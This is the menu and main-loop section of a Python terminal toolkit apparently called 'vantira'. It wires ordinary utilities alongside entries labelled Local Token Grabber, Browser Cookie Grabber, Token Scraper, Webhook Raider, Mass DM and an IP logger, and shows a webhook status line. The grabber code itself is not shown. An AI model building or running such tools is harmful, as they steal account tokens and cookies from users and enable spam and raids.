    ("Base64",                      enc_b64,         "bold yellow"),
    ("URL Encode / Decode",         enc_url,         "yellow"),
    ("Hash Generator",              enc_hash,        "yellow"),
    ("Hex Encode / Decode",         enc_hex,         "yellow"),
    ("Caesar / ROT Cipher",         enc_caesar,      "yellow"),
    ("Binary Encode / Decode",      enc_binary,      "yellow"),
    ("JWT Decoder",                 enc_jwt_decode,  "yellow"),
    # ── system ───────────────────────────────────────────────
    ("SYSTEM INFO", None, None),
    ("System Info",                 sys_info,        "bold blue"),
    ("Environment Variables",       sys_env,         "blue"),
    ("External IP",                 sys_extip,       "blue"),
    ("Running Processes",           sys_processes,   "blue"),
    ("Disk Usage",                  sys_diskinfo,    "blue"),
    # ── osint ────────────────────────────────────────────────
    ("OSINT", None, None),
    ("Username Lookup  [50+ sites]",  osint_username,         "bold magenta"),
    ("Google Dork Builder",           osint_dork,             "magenta"),
    ("Email Format Guesser",          osint_email_guess,      "magenta"),
    ("Domain Full Recon",             osint_domain_recon,     "magenta"),
    ("Reverse Image Search Links",    osint_reverse_image,    "magenta"),
    ("Phone Number Info",             osint_phone,            "magenta"),
    # ── discord osint ─────────────────────────────────────────
    ("DISCORD OSINT", None, None),
    ("User ID Lookup",                disc_user_lookup,       "bold cyan"),
    ("Server Invite Recon",           disc_invite_recon,      "cyan"),
    ("Token Checker",                 disc_token_info,        "cyan"),
    ("Snowflake Decoder",             disc_snowflake,         "cyan"),
    ("Member Join Order",             disc_guild_member_epoch,"cyan"),
    # ── ip logger ────────────────────────────────────────────
    ("IP LOGGER", None, None),
    ("Start Logger Server",           ipl_start,           "bold green"),
    ("Stop Logger Server",            ipl_stop,            "red"),
    ("View Captured Hits",            ipl_view_hits,       "green"),
    ("Clear Hit Log",                 ipl_clear_hits,      "grey70"),
    # ── discord tools ────────────────────────────────────────
    ("DISCORD TOOLS", None, None),
    ("Nitro Gift Checker",            disc_gift_checker,      "bold magenta"),
    ("Nitro Code Gen + Check",        disc_gift_gen,          "magenta"),
    ("Nitro Sniper",                  disc_nitro_sniper,      "magenta"),
    ("Token Scraper from File",       disc_token_scraper,     "cyan"),
    ("Server Info Dump",              disc_server_info,       "cyan"),
    ("Account Age Ranker",            disc_account_age_rank,  "cyan"),
    # ── roblox ───────────────────────────────────────────────
    ("ROBLOX TOOLS", None, None),
    ("User Lookup",                   rblx_user,           "bold red"),
    ("Game Info",                     rblx_game,           "red"),
    ("Group Info",                    rblx_group,          "red"),
    ("Cookie Checker",                rblx_cookie,         "red"),
    ("Username → ID  [bulk]",         rblx_username_to_id, "red"),
    # ── minecraft ─────────────────────────────────────────────
    ("MINECRAFT TOOLS", None, None),
    ("Username → UUID",               mc_uuid,             "bold green"),
    ("Full Profile + Skin",           mc_profile,          "green"),
    ("Server Status",                 mc_server,           "green"),
    ("Name Availability Checker",     mc_name_check,       "green"),
    # ── misc ─────────────────────────────────────────────────
    ("MISC / FUN", None, None),
    ("Password Generator",          misc_pwgen,      "bold white"),
    ("UUID Generator",              misc_uuid,       "white"),
    ("Lorem Ipsum Generator",       misc_lorem,      "white"),
    ("Timestamp Converter",         misc_timestamp,  "white"),
    ("Text Analyzer",               misc_char_counter,"white"),
    ("Color Converter",             misc_color_picker,"white"),
    ("Session Log",                 misc_log,        "grey70"),
    ("Settings",                     misc_settings,      "bold yellow"),
    # ── auto updater ─────────────────────────────────────────
    ("AUTO-UPDATER", None, None),
    ("Check for Updates",             updater_check,      "bold green"),
    # ── offensive / recon ─────────────────────────────────────
    ("OFFENSIVE / RECON", None, None),
    ("Subdomain Brute Forcer",        misc_subdomain_brute,"bold red"),
    ("Directory Brute Forcer",        misc_dir_brute,      "red"),
    # ── discord offensive ─────────────────────────────────────
    ("DISCORD OFFENSIVE", None, None),
    ("Mass DM Members",               disc_mass_dm,        "bold dark_orange"),
    ("Local Token Grabber",           disc_local_token_grab,"dark_orange"),
    ("Webhook Raider",                disc_webhook_raider,  "dark_orange"),
    ("Server Backup",                 disc_server_backup,   "dark_orange"),
    # ── roblox extra ──────────────────────────────────────────
    ("ROBLOX EXTRAS", None, None),
    ("Browser Cookie Grabber",        rblx_browser_cookie,  "bold red"),
]

# only real entries (fn not None) get numbers
# sequential numbers 1..N skipping section headers — must match _draw_menu render order
_ITEMS = []
_n = 0
for _lbl, _fn, _col in MENU:
    if _fn is not None:
        _n += 1
        _ITEMS.append((_n, _lbl, _fn, _col))


# ═════════════════════════════════════════════════════════════
#  MENU RENDERER  — clean single column, grouped by section
# ═════════════════════════════════════════════════════════════
def _draw_menu():
    wipe()
    console.print(_frozen_logo())

    # ── status bar ────────────────────────────────────────────
    if WEBHOOK:
        short = WEBHOOK[:52] + "..." if len(WEBHOOK) > 52 else WEBHOOK
        console.print(f"  [bold green]●[/bold green] [grey50]{short}[/grey50]")
    else:
        console.print(f"  [bold red]●[/bold red] [grey50]no webhook loaded[/grey50]")
    proxy_s = f"proxy: {list(PROXY.values())[0]}" if PROXY else "proxy: none"
    ts      = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    console.print(f"  [grey50]{proxy_s}  ·  {ts}  ·  v{VERSION}[/grey50]")
    console.print(f"  [grey50]{'─'*55}[/grey50]\n")

    # ── items ─────────────────────────────────────────────────
    num = 0
    for label, fn, col in MENU:
        if fn is None:
            # section header — pad label to fixed width for clean look
            hdr = f" {label} "
            pad = "─" * 4
            console.print(f"\n  [grey50]{pad}[bold white]{hdr}[/bold white]{pad}[/grey50]")
        else:
            num += 1
            console.print(f"   [{col}]{num:>2}[/{col}]  [white]{label}[/white]")

    console.print(f"\n   [bold red] 0[/bold red]  [white]Exit[/white]\n")


# ═════════════════════════════════════════════════════════════
#  MAIN
# ═════════════════════════════════════════════════════════════
def main():
    if not HAS_REQ:
        print("[!] pip install requests rich"); sys.exit(1)
    # load saved config before anything renders
    _cfg = cfg_load()
    cfg_apply(_cfg)
    wipe()
    intro()
    # silent update check — shows banner if update available
    try:
        _upd_avail, _upd_ver = _check_update_silent()
    except Exception:
        _upd_avail, _upd_ver = False, ""
    _draw_dashboard(_upd_avail, _upd_ver)

    while True:
        _draw_menu()
        choice = console.input("  [bold yellow][?][/bold yellow] select → ").strip()

        if choice == "0":
            wipe()
            console.print("\n  [bold magenta]vantira[/bold magenta] [grey50]— goodbye ✦[/grey50]\n")
            sys.exit(0)

        try:
            idx = int(choice)
            fn  = next((f for num,_,f,_ in _ITEMS if num==idx), None)
            if fn is None: raise ValueError
            fn()
        except (ValueError, IndexError):
            console.print("  [red]invalid[/red]"); time.sleep(0.6)
        except KeyboardInterrupt:
            pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        wipe()
        console.print(f"\n  [bold magenta]vantira[/bold magenta] [grey50]interrupted ✦[/grey50]\n")
